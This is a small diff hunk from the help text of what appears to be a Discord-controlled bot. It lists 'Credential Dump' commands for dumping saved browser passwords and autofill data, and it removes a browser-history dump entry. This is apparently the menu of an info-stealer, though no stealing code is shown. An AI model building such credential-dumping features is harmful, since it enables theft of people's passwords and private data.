@@ -151,7 +151,6 @@ Credential Dump:
 
 !password              : Dump saved passwords
 !autofill              : Dump saved autofill data
-!history               : Dump browser history
     """
     await ctx.send(f"```{helps}```")
 
